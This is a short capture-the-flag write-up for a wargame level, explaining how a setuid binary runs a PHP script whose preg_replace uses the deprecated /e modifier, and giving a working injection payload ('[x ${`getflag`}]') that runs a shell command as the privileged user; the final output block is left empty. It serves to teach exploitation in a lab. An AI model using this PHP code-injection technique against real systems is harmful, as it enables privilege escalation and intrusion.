# LEVEL 06
In our home directory, we have an executable with suid, and a php script allowing us to know what the executable does:
```
>$ ls -la
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
```
>$ cat level06.php
        #!/usr/bin/php
        <?php
        function y($m) {
                $m = preg_replace("/\./", " x ", $m);
                $m = preg_replace("/@/", " y", $m);
                return $m;
                }
        function x($y, $z) {
                $a = file_get_contents($y);
                $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
                $a = preg_replace("/\[/", "(", $a);
                $a = preg_replace("/\]/", ")", $a); return $a;
        }
        $r = x($argv[1], $argv[2]); print $r;
        ?>
```
In the second function called by the script, we see the use of a regex with `/e` modifier which is depecrated in recent php regex flags, 
so if it is set, `preg_replace()` does normal **substitution of backreferences** in the replacement string, **evaluates it as PHP code**, and uses the result for replacing the search string, 
it can easily introduce remote **code execution vulnerabilities**.

Exploit this by passing our own code implementation , which will be evaluated as `PHP code` and executed as `user flag06`.

our argument should pass the regex test `"/(\[x (.*)\])/e"`, and respect the form `[x <our PHP code>]`:
```
>$ echo '[x ${`getflag`}]' > /tmp/getflag
>$ cat /tmp/getflag
[x ${`getflag`}]
```
When we run the executable, passing our file as argument:
```        
>$ ./level06 /tmp/getflag

#### Vulnerability:
* Deprecated `/e` regex modifier in script owned by privileged user -> Privilege escalation via PHP code injection.
